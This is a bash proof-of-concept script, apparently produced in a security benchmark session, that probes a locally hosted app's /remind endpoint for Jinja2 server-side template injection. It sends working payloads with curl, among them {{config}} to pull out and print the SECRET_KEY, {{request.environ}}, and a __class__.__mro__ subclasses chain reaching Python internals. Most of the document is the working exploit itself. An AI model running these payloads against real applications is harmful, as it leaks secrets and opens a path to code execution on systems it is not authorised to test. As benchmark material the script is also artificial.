#!/bin/bash
# POC: Demonstrates Server-Side Template Injection (SSTI) in the /remind endpoint allowing Jinja2 template code execution
# Target: ./repo
# Created: 2025-12-01T16:01:24.158Z
# Session: benchmark-XBEN-093-24-minbvw4l

# Server-Side Template Injection (SSTI) POC for /remind endpoint
# This script demonstrates Jinja2 template injection vulnerability

TARGET="${1:-http://localhost:5003}"
REMIND_ENDPOINT="${TARGET}/remind"

echo "=========================================="
echo "SSTI Vulnerability POC - /remind Endpoint"
echo "=========================================="
echo ""

# Test 1: Basic math expression evaluation
echo "[*] Test 1: Basic Math Expression Evaluation (7*7)"
echo "    Testing if Jinja2 expressions are evaluated..."
RESPONSE=$(curl -s "${REMIND_ENDPOINT}?date={{7*7}}")
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "49"; then
    echo "    ✓ VULNERABLE: Expression evaluated (got 49 instead of {{7*7}})"
else
    echo "    ✗ Safe: Expression not evaluated"
fi
echo ""

# Test 2: Configuration object leak (SECRET_KEY)
echo "[*] Test 2: Configuration Object Leak - SECRET_KEY"
echo "    Testing if config object can be accessed..."
RESPONSE=$(curl -s "${REMIND_ENDPOINT}?date={{config}}")
echo "    Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "SECRET_KEY"; then
    echo "    ✓ VULNERABLE: Config object accessible, SECRET_KEY exposed"
    SECRET_KEY=$(echo "$RESPONSE" | grep -oP '"SECRET_KEY":\s*"\K[^"]+' | head -1)
    if [ ! -z "$SECRET_KEY" ]; then
        echo "    Leaked SECRET_KEY: $SECRET_KEY"
    fi
else
    echo "    ✗ Safe: Config object not accessible"
fi
echo ""

# Test 3: Request environment access
echo "[*] Test 3: Request Environment Access"
echo "    Testing if request.environ can be accessed..."
RESPONSE=$(curl -s "${REMIND_ENDPOINT}?date={{request.environ}}" | head -c 200)
echo "    Response (first 200 chars): $RESPONSE"
if echo "$RESPONSE" | grep -q "environ"; then
    echo "    ✓ VULNERABLE: Request environment accessible"
else
    echo "    ✗ Safe: Request environment not accessible"
fi
echo ""

# Test 4: Attempt to execute Python code via __class__
echo "[*] Test 4: Python Code Execution via __class__ Chain"
echo "    Testing if Python code can be executed via __class__..."
PAYLOAD="{{''.__class__.__mro__[1].__subclasses__()}}"
RESPONSE=$(curl -s "${REMIND_ENDPOINT}?date=$(printf %s "$PAYLOAD" | jq -sRr @uri)" 2>/dev/null | head -c 300)
echo "    Response (first 300 chars): $RESPONSE"
if echo "$RESPONSE" | grep -q "type\|class"; then
    echo "    ✓ VULNERABLE: Access to Python internals"
else
    echo "    ? Unable to confirm code execution"
fi
echo ""

echo "=========================================="
echo "POC Summary:"
echo "=========================================="
echo "If any tests show ✓ VULNERABLE, the /remind endpoint is"
echo "susceptible to Server-Side Template Injection attacks."
echo ""